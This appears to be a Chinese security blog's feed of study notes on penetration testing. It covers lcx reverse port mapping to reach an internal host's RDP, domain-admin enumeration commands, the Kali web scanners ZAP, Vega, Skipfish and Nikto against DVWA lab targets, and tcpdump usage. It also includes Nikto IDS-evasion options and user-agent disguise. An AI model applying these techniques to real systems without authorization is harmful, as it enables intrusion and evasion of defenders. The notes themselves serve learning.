title="web权限提升"></a>web权限提升</h3><p>mstsc进行远程桌面连接</p><p>内网：<br>1.反相连接<br>让远程服务器自己来向本地计算机请求，从而解决无法主动向内部服务器发送数据的问题。<br>lcx.exe是一款著名的反向连接的内网端口映射工具。<br>本机：lcx-listen 51 3389<br>这条命令的作用是将本地的51端口与3389端口开启监听状态，并且使两端互相开启映射<br>服务器：lcx.exe-slave 192.168.49.151 192.168.129 3389<br>这样3389端口服务器就会向51端口服务器请求连接，并且将从51端口获取的数据传给3389端口。</p><h3 id="基于内网的入侵"><a href="#基于内网的入侵" class="headerlink" title="基于内网的入侵"></a>基于内网的入侵</h3><p>局域网(Local Area Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能<br>决定局域网的主要技术要素为：网络拓扑，传输介质与介质访问控制方法。</p><h3 id="内网信息刺探"><a href="#内网信息刺探" class="headerlink" title="内网信息刺探"></a>内网信息刺探</h3><h4 id="获取主机网络信息"><a href="#获取主机网络信息" class="headerlink" title="获取主机网络信息"></a>获取主机网络信息</h4><p>ipconfig查询这台主机的主机名物理mac地址 IP地址 网关地址以及DNS服务器和DHCP服务器地址等信息。在获取了主机网卡信息之后，如果该主机处于域中，还可以通过的命令提示符获取域信息。<br>使用net view 显示当前域或工作组中的计算机列表，<br>使用net view /domain[:Domain Name]指定要查看其可用计算机的域，<br>net user /domain 查看域用户列表<br>net group “domain admins” /domain 查看管理组成员<br>net user Administrator/domain 查看域管理员信息<br>net /help或者net ？获取net命令可操作对象<br>获取主机用户密码</p><h4 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h4><p>APR协议可以通过Ip地址获取MAC地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;a href=&quot;#黑客攻防web安全实战详解&quot; class=&quot;headerlink&quot; title=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;/a&gt;黑客攻防web安全实战详解&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://0xmj.club/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="黑客攻防web安全实战详解" scheme="http://0xmj.club/tags/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-QWASP-ZAP/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-QWASP-ZAP/</id>
    <published>2018-02-27T11:54:20.000Z</published>
    <updated>2018-02-27T11:55:35.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-QWASP-ZAP"><a href="#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP"></a>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</h1><p>扫描工具-QWASP_ZAP</p><p>十大安全工具之一，集成性工具，功能完善，而且强大。既可做主动扫描，也可做截断代理。开源免费跨平台，简单易用，体验相对混乱，但在主动扫描方面，相对占优。【kali集成】(主动扫描方面比burp好)</p><pre><code>####建议选择第二项####注意检查更新</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251642_866.jpg" alt=""></p><p>更新与插件安装</p><pre><code>安装插件release和beta【release：成熟版  beta：测试版  alpha：不成熟版】</code></pre><p>截断代理【结合手动爬网】</p><pre><code>默认情况下，代理功能自启动1、启动浏览器代理2、</code></pre><p>2、主动扫描</p><pre><code>一、快速爬网扫描二、直接扫描爬到的内容对于要身份认证才能访问的网页无法进行扫描，需要进行身份认证配置Fuzz二、</code></pre><p>结果分析：</p><pre><code>1、查看Code【200 OK】（）若为302，则是重定向2、查看Size Resp.Header是否不同</code></pre><p>暴力破解：</p><pre><code>API功能【程序接口】~http:/zap/【代理已经指向OWASP_ZAP】</code></pre><p>3、使用方法</p><pre><code>0、Persist Session1.四种模式Mode----safe&lt;protect&lt;standard&lt;ATTACK【小心选择扫描模式】2、升级add-ons3、Scan Profile（扫描策略）    右键-&gt;攻击-&gt;Active Scan    自定义扫描策略4、Anti CSRF Tokens【某些网站为了防止CSRF攻击，每次随机生成Tokens】5、扫描https网站时，出现证书报错，通过导入ssl证书，则不会出现错误6、Scope / Contexts（范围） / filter    #Scope  以相同的策略进行扫描（包含context）    #Contexts7、Http Sessions——default session tokens &amp; site session tokens    Session  Properties  #使用默认Manual已能满足大多数，失效再考虑下面#使用表单进行身份认证#脚本认证Script，需自己编写脚本【有脚本模版】#默认情况下，只认定指定的Session的名，必须手动添加其他Session【如：security】 #显示http Session tab    #用于使用不同用户登录审计，判断是否有越权8、Note / tag【添加各种标签，方便审计】9、Passive scan</code></pre><p>############################################################################################</p><p>#实时截断【注意截断时间，需快速】</p><pre><code>##返回的结果也会拦截</code></pre><p>#显示隐藏域</p><p>###隐藏域在客户端是为了降低客户端对服务端的请求过程，提高速度和用户体验。若服务端没对数据进行检验或检查，可进行价格修改和恶意代码注入等</p><pre><code>#被动扫描规则#爬网域值</code></pre><p>##########################################################################################</p><p>扫描标准流程</p><pre><code>设置代理手动爬网自动爬网     #强制浏览web服务器【有可能发现一些web目录】    #强制目录浏览、强制目录和子目录爬网【有各自的字典】主动扫描【active scan】</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-QWASP-ZAP&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-QWASP_ZAP&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="QWASP_ZAP" scheme="http://0xmj.club/tags/QWASP-ZAP/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Vega</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Vega/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Vega/</id>
    <published>2018-02-27T11:51:36.000Z</published>
    <updated>2018-02-27T11:52:13.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Vega"><a href="#kali渗透测试之Web渗透-扫描工具-Vega" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Vega"></a>kali渗透测试之Web渗透-扫描工具-Vega</h1><p>##任务6： WEB扫描工具-Vega</p><p> 纯图形化界面，Java编写的开源web扫描器。两种工作模式：扫描模式和代理模式【主流扫描功能】。用于爬站。处理表单，注入测试等。支持SSL：<a href="http://vega/ca.crt" target="_blank" rel="external">http://vega/ca.crt</a></p><p>专注于应用程序代码方面的漏洞</p><p>Vega<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251348_627.jpg" alt=""></p><pre><code>#基于字典发现网站目录</code></pre><p>代理模式</p><p>被动收集信息，结合手动爬站【即页面中能点击的链接全部点击一遍，能提交数据的地方，全部提交一遍】</p><p>连接到网站外面的链接可以暂时不用管<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_64.jpg" alt=""></p><pre><code>#设置外部代理服务器</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_630.jpg" alt=""></p><pre><code>#删除user-agent尾部的vega字样</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_272.jpg" alt=""></p><pre><code>#设置代理</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_285.jpg" alt=""></p><pre><code>1、setup重置【方便用户初始安装和配置】设置安装完成后，一定要删掉，不能留在服务器。如果权限设置不当，通过非授权访问到，可篡改数据库内容</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_130.jpg" alt=""></p><pre><code>2、提交数据【随便输入，目的：被Vega抓取数据】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_567.jpg" alt=""></p><pre><code>3、URL【?参数=***】在等号后面的值，添加不正常的内容，看返回结果4、view source【服务器端源代码，正常Web application中没有此功能，只为了分析漏洞而提供的功能】5、上传位置【同理：成功与否，无所谓】6、反射性XSS【输入什么内容，就返回什么内容】7、论坛或收集反馈的典型表单页面【】8、phpinfo  #安装PHP后，测试是否能否正常工作 【泄漏大量服务器配置信息】#左边灰白色为页面中存在的链接</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_798.jpg" alt=""></p><pre><code>#部分扫描结果</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_220.jpg" alt=""></p><pre><code>9、事后操作-修改内容重放【在时间失效之前】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_991.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_491.jpg" alt=""></p><pre><code>截断功能【代理方面有所欠缺】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_90.jpg" alt=""><br>扫描模式【切换】</p><pre><code>vega主动，对页面中的内容、参数进行扫描</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_475.jpg" alt=""></p><pre><code>配置1、准备     #定义身份认证信息    1、basic http authentication    #http基本身份认证    2、digest http authentication   #http摘要身份认证    3、NTLM                                 #windows系统账号密码认证【未加入域】    4、macro                                 #基于表单【大部分web应用身份认证】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_2.jpg" alt=""></p><pre><code>        #创建宏</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_704.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_133.jpg" alt=""></p><pre><code>2、开始</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_828.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_280.jpg" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_318.jpg" alt=""></p><pre><code>#查看详细信息console</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_31.jpg" alt=""></p><pre><code>#请求内容的过程</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_181.jpg" alt=""></p><p>https证书加密网站【即其既是一个服务网站，又是一个可信证书颁发机构】的扫描【截断代理】</p><pre><code>签名证书：由权威颁发机构颁发给服务器或者个人用于证明自己身份的东西，默认客户端都是信任的。主要目的是用来加密和保证数据的完整性和不可抵赖性自签名证书：由服务器自己颁发给自己，用于证明自己身份的东西，非权威颁发机构发布，默认客户端都是不信任的，主要目的是用来加密和保证数据的完整性和不可抵赖性,与签名证书相同.创建自签名SSL证书：http://www.cnblogs.com/lihuang/articles/4205540.html也是类似，通过vega作为代理服务器，伪造证书，进行信息劫持，进行但要注意：####当访问网站出现信任报错时，可能是有人伪造了证书【如：百度号称全站https，淘宝、阿里、facebook】查看证书</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_9.jpg" alt=""></p><pre><code>#右键 View Page info</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_884.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Vega&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Vega&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Vega&quot;&gt;&lt;/a&gt;kali渗透测试之Web渗透
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Vega" scheme="http://0xmj.club/tags/Vega/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Skipfish</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Skipfish/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Skipfish/</id>
    <published>2018-02-27T11:49:37.000Z</published>
    <updated>2018-02-27T11:50:16.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Skipfish"><a href="#kali渗透测试之Web渗透-扫描工具-Skipfish" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Skipfish"></a>kali渗透测试之Web渗透-扫描工具-Skipfish</h1><h2 id="任务8：-skipfish"><a href="#任务8：-skipfish" class="headerlink" title="任务8： skipfish"></a>任务8： skipfish</h2><p>Skipfish是一个命令行模式，以C语言编写的积极的Web应用程序的安全性侦察工具，没有代理模式。 它准备了一个互动为目标的网站的站点地图进行一个递归爬网和基于字典的探头。</p><pre><code>优点：速度比较快【多路单线程，全异步网络I/O，消除内存管理和调度开销，支持启发式自动内容识别】，误报相对低</code></pre><p>使用方式：【<a href="https://my.oschina.net/u/995648/blog/114321】" target="_blank" rel="external">https://my.oschina.net/u/995648/blog/114321】</a></p><pre><code>基本命令使用方式    skipfish -o test http:1.1.1.1   #指定输出目录/路径    #ctrl -c   停止    #空格     显示详细信息</code></pre><p>skipfish -o test http:192.168.57.143/dvwa/<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251434_19.png" alt=""><br>打开根目录下的skipfishtest1/index.html文件即可查看详细信息</p><pre><code>    skipfish -o test @url.txt             #字典文件</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251439_346.png" alt=""><br>        skipfish -o test -S complet.wl -Wa.wl <a href="http://1.1.1.1" target="_blank" rel="external">http://1.1.1.1</a>   #指定集成参数字典，发现隐藏目录</p><pre><code>        #dpkg -L skipfish | grep wl</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251458_169.png" alt=""></p><pre><code>-I （i）：只检查包含‘string’的URL     【适用于大型网站】    skipfish -o test1 -I /dvwa/ http://192.168.57.143/dvwa/-X：不检查包含‘string’的URL   【如：logout】-K：不对指定参数进行fuzz测试-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】-l：每秒最大请求数-m：每IP最大并发连接数【依据带宽】--config：指定配置文件 【将参数命令写入一个配置文件】</code></pre><p>身份认证【在一种方式不成功的情况下，使用其他方式】</p><pre><code>    skipfish -A user:pass -o test http://1.1.1.1    #基本http身份认证    skipfish  -C &quot;PHPSESSID=&quot; -C &quot;security=&quot; -o test http://1.1.1.1   #</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251505_541.png" alt=""><br>       基于cookie</p><pre><code>    Usename / Password                           #直接提交表单        ep：skipfish -o a --auth-form http://192.168.1.109/dvwa/login.php --auth-form-target http://192.168.1.109/dvwa/login.php   --auth-user-filed usename --auth-user admin -auth-pass-filed password -auth-pass password --auth-verify-url http://192.168.1.109/dvwa/index.php -I /dvwa/ http://192.168.1.109/dvwa/</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Skipfish&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Skipfish&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Skipfish&quot;&gt;&lt;/a&gt;ka
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Skipfish" scheme="http://0xmj.club/tags/Skipfish/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Nikto</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Nikto/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Nikto/</id>
    <published>2018-02-27T11:47:03.000Z</published>
    <updated>2018-02-27T11:47:51.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Nikto"><a href="#kali渗透测试之Web渗透-扫描工具-Nikto" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Nikto"></a>kali渗透测试之Web渗透-扫描工具-Nikto</h1><h2 id="任务4：实验环境Metasploaitable和侦察HTTRACK"><a href="#任务4：实验环境Metasploaitable和侦察HTTRACK" class="headerlink" title="任务4：实验环境Metasploaitable和侦察HTTRACK"></a>任务4：实验环境Metasploaitable和侦察HTTRACK</h2><p>httrack 克隆一个网站页面到本地<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231143_886.png" alt=""><br>mkdir dvwa 创建一个目录<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231145_468.png" alt=""></p><p>侦察【减少与目标系统交互】</p><pre><code>Httrack：将WEB可下载的页面下载到本机，再进行本地检查【kali下安装】##可到此网站获取代理：hidemyass.com【免费代理需小心】</code></pre><h2 id="任务5：扫描工具-Nikto"><a href="#任务5：扫描工具-Nikto" class="headerlink" title="任务5：扫描工具-Nikto"></a>任务5：扫描工具-Nikto</h2><p>基于WEB的扫描工具，基本都支持两种扫描模式。代理截断模式，<strong>主动扫描模式</strong></p><p>手动扫描：作为用户操作发现页面存在的问题，但可能会存在遗漏</p><p>自动扫描：基于字典，提高速度，但存在误报和触发警告</p><p>参考书：Web_Penetration_Testing_with_Kali_Linux</p><p>Nikto【纯主动型】<br>   Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。<br>扫描内容：</p><pre><code>1、软件版本2、搜索存在安全隐患的文件【如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码】3、服务器配置漏洞【组件可能存在默认配置】    4、WEB Application层面的安全隐患【xss，SQL注入等】    5、避免404误判        ·很多服务器不遵守RFC标准，对于不存在的对象返回200响应码        ·依据响应文件内容判断，不同扩展名【jsp、cji】的文件404响应内容不同        ·去除时间信息后的内容取MD5值        ·参数：-no404【不进行误判尝试判断，可能存在误判】</code></pre><p>命令详解：</p><pre><code>nikto 主要参数man nikto 更多参数nikto -update   #直接更新数据库，厂商网址可能被墙 【在此网站可下载最新版http://cirt.net/nikto/UPDATES/】nikto  -list-plugins       #插件列表</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251346_435.jpg" alt=""></p><pre><code>nikto -host http://1.1.1.1 （目标）nikto -host 192.168.1.1 -ssl -port 443,8443,995 扫描端口例如：nikto -host www.baidu.com -port 443 -sslssl即https的端口默认为443</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041704_648.png" alt=""></p><p>nikto -host <a href="http://192.168.1.109/dvwa/" target="_blank" rel="external">http://192.168.1.109/dvwa/</a>           #指定网站目录扫描</p><pre><code>nikto -host 192.168.1.1.109 -port 80,443      #可指定多个端口【加-output：输出结果】nikto -host host.txt   #扫描多个IPnmap -p80 192.168.1.0/24 -oG - | nikto -host -        #结合nmap，对一个网段内开放了80端口的主机进行扫描 nikto -host https://www.baidu.com -useproxy http://localhost:8087     #使用代理-vhost  【+域名】   #虚拟IP，区分网站【使用背景：一个ip对应多个网站】</code></pre><p>交互性参数【用于扫描过程中】</p><pre><code>回车：报告当前状态v：正在扫描的详细信息（路径，结果等）#再按v就停止d：极其详细的信息，包括传strong text输内容     #e：错误信息                                    #p：显示进度                               #r：重定向                                   #c：cookiea：身份认证q：退出N：下一个主机（用于多个IP）P：暂停</code></pre><p>nikto配置文件【大部分需要登录进网站，才能进行扫描】</p><pre><code>    -id+    #使用http身份认证【但现在很少】支持指定cookie    vi /etv/nikto.conf</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251338_899.jpg" alt=""></p><pre><code>    #修改useagent【默认配置，容易被管理员发现】    USERAGENT=Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_604.jpg" alt=""></p><pre><code>    #抓包分析，获取cookie</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_197.jpg" alt=""></p><pre><code>    #修改cookie信息【让nikto获得身份认证，进行进一步扫描】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_949.jpg" alt=""></p><pre><code>    -evasion：使用LibWhisker中对IDS的逃避技术，可使用以下几种类型    1、随机URL编码（非UTF-8方式）    2、自选路径（/./）    3、过早结束的URL    4、优先考虑长随机字符串    5、参数欺骗    6、使用TAB作为命令的分隔符    7、使用变化的URL    8、使用windows路径分隔符”\“</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_7.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Nikto&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Nikto&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Nikto&quot;&gt;&lt;/a&gt;kali渗透测试之We
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Nikto" scheme="http://0xmj.club/tags/Nikto/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-工具-TCPDUMP</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7-TCPDUMP/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-工具-TCPDUMP/</id>
    <published>2018-02-27T11:42:43.000Z</published>
    <updated>2018-02-27T11:44:07.033Z</updated>
    
    <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-TCPDUMP</p><h2 id="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><a href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录" class="headerlink" title="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"></a>TCPDUMP-抓包、筛选、高级筛选、过程文档记录</h2><p>TCPDUMP</p><p>  No-GUI的抓包分析工具</p><p>  Linux、Unix系统默认安装</p><h3 id="TCPdump—–抓包"><a href="#TCPdump—–抓包" class="headerlink" title="TCPdump—–抓包"></a>TCPdump—–抓包</h3><p>抓包</p><p>  默认只抓68个字节</p><p>  指定端口 -s0指定包有多大就抓多大<br>  tcpdump -i eth0 -s 0 -w file.pcap</p><p>  tcpdump -i eth0 port 22</p><p>读取抓包文件</p><p>  Tcpdump -r file.pcap</p><h3 id="选项介绍"><a href="#选项介绍" class="headerlink" title="选项介绍"></a>选项介绍</h3><p>-A 以ASCII格式打印出所有分组，并将链路层的头最小化。 </p><p>-c 在收到指定的数量的分组后，tcpdump就会停止。 </p><p>-C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </p><p>-d 将匹配信息包的代码以人们能够理解的汇编格式给出。 </p><p>-dd 将匹配信息包的代码以c语言程序段的格式给出。 </p><p>-ddd 将匹配信息包的代码以十进制的形式给出。 </p><p>-D 打印出系统中所有可以用tcpdump截包的网络接口。 </p><p>-e 在输出行打印出数据链路层的头部信息。 </p><p>-E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </p><p>-f 将外部的Internet地址以数字的形式打印出来。 </p><p>-F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </p><p>-i 指定监听的网络接口。 </p><p>-l 使标准输出变为缓冲行形式，可以把数据导出到文件。 </p><p>-L 列出网络接口的已知数据链路。 </p><p>-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </p><p>-M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </p><p>-b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</p><p>-n 不把网络地址转换成名字。</p><p>-nn 不进行端口名称的转换。</p><p>-N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </p><p>-t 在输出的每一行不打印时间戳。 </p><p>-O 不运行分组分组匹配（packet-matching）代码优化程序。 </p><p>-P 不将网络接口设置成混杂模式。 </p><p>-q 快速输出。只输出较少的协议信息。 </p><p>-r 从指定的文件中读取包(这些包一般通过-w选项产生)。 </p><p>-S 将tcp的序列号以绝对值形式输出，而不是相对值。 </p><p>-s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p><p>-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </p><p>-t 不在每一行中输出时间戳。 </p><p>-tt 在每一行中输出非格式化的时间戳。 </p><p>-ttt 输出本行和前面一行之间的时间差。 </p><p>-tttt 在每一行中输出由date处理的默认格式的时间戳。 </p><p>-u 输出未解码的NFS句柄。 </p><p>-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </p><p>-vv 输出详细的报文信息。 </p><p>-w 直接将分组写入文件中，而不是不分析并打印出来。</p><p>root:～# tcpdump -h          </p><pre><code> enter code heretcpdump version 4.3.0libpcap version 1.3.0Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ][ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds]             [ -i interface ] [ -j tstamptype ] [ -M secret ]             [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]             [ -W filecount ] [ -y datalinktype] [ -z command ]             [ -Z user ] [ expression ]</code></pre><p>root:～# tcpdump -i eth0 -s 0 -w a.cap     //监听网络接口字节为0保存到a.cap文件中</p><p>tcpdump: listening on eth0, link-type EN10MB(Ethernet), capture size 65535 bytes</p><p>^C15 packets captured</p><p>15 packets receiced by filter</p><p>0 packets drodded by kernel</p><p>root:～# tcpdump -r a.cap                  //读取a.cap文件内容</p><p>root:～# tcpdump -A -r a.cap               //以ASCII格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -X -r a.cap               //以十六进制格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -i eth0 tcp port 22</p><p>TCPDUMP——筛选</p><p>  tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>  tcpdump -n src host 145.254.160.237 -r http.cap</p><p>  tcpdump -n dst host 145.254.160.237 -r http.cap</p><p>  tcpdump -n port 53 -r http.cap</p><p>  tcpdump -nX port 80 -r http.cap</p><p>root:～/Downloads# tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>reading from file http.cap, link type En10MB(Ethernet)</p><p>145.253.2.203.53</p><p>145.254.160.237.3009</p><p>145.254.160.237.3371</p><p>145.254.160.237.3372</p><p>216.239.59.99.80</p><p>65.208.228.223.80</p><p>0                  1                    2                   3</p><p>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|          Source Port          |     Destination Port          |       </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                        Sequence Number                        |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Acknowledgment Nuber                     |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|  Date  |      |C|E|U|A|P|R|A|F|                               |</p><p>| Offset |  Res.|W|C|R|C|S|S|Y|I|         Windwos               |</p><p>|        |      |R|E|G|K|H|T|N|N|                               |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|            Checksum           |     Urgent Pointer            |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Options               |     Padding      |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                                data                           |          </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>CEUAPRSF</p><p>00011000 = 24 in decimal</p><p>TCPDUMP——高级筛选</p><p>  tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p><p>过程文档记录</p><p>  Dradis</p><pre><code>短期临时小团队资源共享各种插件导入文件</code></pre><p>  keepnote</p><p>  